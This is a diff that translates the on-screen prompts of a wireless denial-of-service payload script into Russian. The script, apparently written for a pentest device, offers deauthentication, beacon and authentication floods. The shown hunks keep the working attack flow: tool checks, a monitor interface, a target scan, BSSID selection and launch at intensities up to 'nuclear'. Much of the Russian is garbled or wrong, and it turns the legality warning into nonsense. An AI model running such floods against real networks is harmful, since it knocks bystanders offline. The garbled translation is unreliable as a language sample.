@@ -8,21 +8,20 @@
 LOOT_DIR="/mmc/nullsec/floodgate"
 mkdir -p "$LOOT_DIR"
 
-PROMPT "FLOODGATE
+PROMPT "НАНОВЕДЭНИЕ
 
-Multi-vector wireless
-denial of service.
+Многовекторный бережный DoS.
 
-Attack vectors:
-- Deauthentication flood
-- Beacon frame flood
-- Authentication flood
-- Combined assault
+Векторы атак:
+- Поток деаутентификации
+- Наводнение beacon кадров
+- Наводнение аутентификации
+- Комбинированная ассалт
 
-WARNING: Highly disruptive
-Illegal without permission.
+ОСТОРОЖНОСТЬ: Экстремально разрушительная
+Бесплатная без калисрующих доступа.
 
-Press OK to configure."
+Нажмите OK для конфигурирования."
 
 # Check tools
 MISSING=""
@@ -31,11 +30,11 @@ command -v mdk3 >/dev/null 2>&1 && HAS_MDK3=1 || HAS_MDK3=0
 command -v mdk4 >/dev/null 2>&1 && HAS_MDK4=1 || HAS_MDK4=0
 
 if [ -z "$(command -v aireplay-ng 2>/dev/null)" ] && [ $HAS_MDK3 -eq 0 ] && [ $HAS_MDK4 -eq 0 ]; then
-    ERROR_DIALOG "No flood tools found!
+    ERROR_DIALOG "Оружие наводнения не найдены!
 
-Install:
+Установите:
 opkg install aircrack-ng
-opkg install mdk3 or mdk4"
+opkg install mdk3 или mdk4"
     exit 1
 fi
 
@@ -44,39 +43,39 @@ MONITOR_IF=""
 for iface in wlan1mon wlan2mon mon0; do
     [ -d "/sys/class/net/$iface" ] && MONITOR_IF="$iface" && break
 done
-[ -z "$MONITOR_IF" ] && { ERROR_DIALOG "No monitor interface!
+[ -z "$MONITOR_IF" ] && { ERROR_DIALOG "Нет интерфейса монитора!
 
 airmon-ng start wlan1"; exit 1; }
 
-PROMPT "ATTACK VECTOR:
+PROMPT "ВЕКТОР АТАКИ:
 
-1. Deauth flood
-2. Beacon flood
-3. Auth flood
-4. Combined (all three)
-5. Targeted deauth
+1. Поток деаутентификации
+2. Поток beacon-кадров
+3. Поток аутентификации
+4. Комбинированные (все три)
+5. Целевая деаутентификация
 
-Monitor: $MONITOR_IF
+Мониторинг: $MONITOR_IF
 
-Select vector next."
+Выберите вектор."
 
-ATTACK_VECTOR=$(NUMBER_PICKER "Vector (1-5):" 1)
+ATTACK_VECTOR=$(NUMBER_PICKER "Вектор (1-5):" 1)
 case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) ATTACK_VECTOR=1 ;; esac
 
 # Intensity setting
-PROMPT "INTENSITY:
+PROMPT "МОЩНОСТЬ:
 
-1. Low (stealthy)
-2. Medium (balanced)
-3. High (aggressive)
-4. Maximum (nuclear)
+1. Низкая (тихая)
+2. Средняя (сбалансированная)
+3. Высокая (агрессивная)
+4. Максимальная (ядерная)
 
-Higher = more disruption
-but more detectable.
+Область = больше прерывания
+но больше выявляемости.
 
-Select intensity next."
+Выберите мощность."
 
-INTENSITY=$(NUMBER_PICKER "Intensity (1-4):" 2)
+INTENSITY=$(NUMBER_PICKER "Мощность (1-4):" 2)
 case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) INTENSITY=2 ;; esac
 
 case $INTENSITY in
@@ -86,14 +85,14 @@ case $INTENSITY in
     4) DELAY=0;   PACKETS=0;    LABEL="Maximum" ;;
 esac
 
-DURATION=$(NUMBER_PICKER "Duration (seconds):" 60)
+DURATION=$(NUMBER_PICKER "Нониторинг (сек):" 60)
 case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) DURATION=60 ;; esac
 
 # Target selection for targeted attacks
 TARGET_BSSID=""
 TARGET_CHANNEL=""
 if [ "$ATTACK_VECTOR" = "1" ] || [ "$ATTACK_VECTOR" = "4" ] || [ "$ATTACK_VECTOR" = "5" ]; then
-    SPINNER_START "Scanning for targets..."
+    SPINNER_START "Сканирование целей..."
     SCAN_FILE="/tmp/flood_scan_$$.csv"
     timeout 10 airodump-ng "$MONITOR_IF" --output-format csv -w "/tmp/flood_scan_$$" 2>/dev/null &
     sleep 10
@@ -103,11 +102,11 @@ if [ "$ATTACK_VECTOR" = "1" ] || [ "$ATTACK_VECTOR" = "4" ] || [ "$ATTACK_VECTOR
     TARGETS=$(grep -E "([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}" "${SCAN_FILE}-01.csv" 2>/dev/null | head -8)
     SPINNER_STOP
 
-    PROMPT "TARGETS FOUND:
+    PROMPT "НАЙДЕНО ЦЕЛЕЙ:
 
 $(echo "$TARGETS" | awk -F, '{print NR". "$1" ch"$4" "$14}' | head -8)
 
-Enter target BSSID."
+Введите BSSID цели."
 
     TARGET_BSSID=$(TEXT_PICKER "BSSID:" "$(echo "$TARGETS" | head -1 | awk -F, '{print $1}' | xargs)")
     case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED)
@@ -123,24 +122,24 @@ Enter target BSSID."
     rm -f "${SCAN_FILE}"*
 fi
 
-resp=$(CONFIRMATION_DIALOG "LAUNCH FLOODGATE?
+resp=$(CONFIRMATION_DIALOG "ИНГИЕ FLOODGATE?
 
-Vector: $ATTACK_VECTOR
-Intensity: $LABEL
-Длительность: ${DURATION}s
-Target: ${TARGET_BSSID:-broadcast}
-Channel: ${TARGET_CHANNEL:-all}
+Вектор: $ATTACK_VECTOR
+Мощность: $LABEL
+Нониторинг: ${DURATION}с
+Цель: ${TARGET_BSSID:-broadcast}
+Kanal: ${TARGET_CHANNEL:-all}
 
-THIS IS DESTRUCTIVE!
+ЭТО РАЗРУШИТЕЛЬНО!
 
-Confirm?")
+Подтвердить?")
 [ "$resp" != "$DUCKYSCRIPT_USER_CONFIRMED" ] && exit 0
 
 TIMESTAMP=$(date +%Y%m%d_%H%M)
 FLOOD_LOG="$LOOT_DIR/flood_$TIMESTAMP.log"
 
-LOG "FloodGate: Vector $ATTACK_VECTOR, Intensity $LABEL"
-SPINNER_START "FloodGate active..."
+LOG "Флудгейт: Вектор $ATTACK_VECTOR, Мощность $LABEL"
+SPINNER_START "Флудгейт активен..."
 
 PIDS=""
 
@@ -212,16 +211,16 @@ esac
 
 SPINNER_STOP
 
-PROMPT "FLOODGATE ACTIVE!
+PROMPT "ФЛУДГЕЙТ АКТИВНОН!
 
-Vector: $ATTACK_VECTOR
-Intensity: $LABEL
-Длительность: ${DURATION}s
+Вектор: $ATTACK_VECTOR
+Мощность: $LABEL
+Нониторинг: ${DURATION}с
 
-Attack in progress...
+Атака в процессе...
 
-Press OK to wait for
-completion."
+Нажмите OK для ожидания
+завершения."
 
 # Wait for all attack processes
 for pid in $PIDS; do
@@ -230,11 +229,11 @@ done
 
 LOG_SIZE=$(wc -l < "$FLOOD_LOG" 2>/dev/null | tr -d ' ')
 
-PROMPT "FLOODGATE COMPLETE
+PROMPT "ФЛУДГЕЙТ ЗАВЕРШЕН
 
-Длительность: ${DURATION}s
-Log lines: $LOG_SIZE
+Время гонки: ${DURATION}с
+Cтроки Лога: $LOG_SIZE
 
-Saved: $FLOOD_LOG
+Сохранено: $FLOOD_LOG
 
-Press OK to exit."
+Нажмите OK для выхода."
